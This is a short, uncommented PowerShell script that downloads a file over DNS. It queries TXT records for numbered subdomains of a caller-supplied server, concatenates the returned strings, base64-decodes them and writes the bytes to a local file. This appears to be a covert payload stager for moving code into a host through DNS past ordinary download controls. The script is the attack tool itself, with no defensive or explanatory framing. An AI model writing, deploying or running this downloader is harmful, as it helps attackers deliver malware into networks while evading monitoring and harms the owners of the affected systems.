param ([string]$server)
$payload=""
for($i=0;$i -ge 0;$i++){
$command='cmd.exe /C nslookup -type=TXT '+$i+'.$server'
$a=Invoke-Expression -Command:$command
$c=[string]$a
$fIdx=$c.IndexOf('"')+1
$lIdx=$c.LastIndexOf('"')
$len=$lIdx-$fIdx
if($error.Count -ge 1){
$i=-10
}
$payload=$payload+$c.Substring($fIdx,$len)
}
$o=[Convert]::FromBase64String($payload)
[io.file]::WriteAllBytes('output',$o)
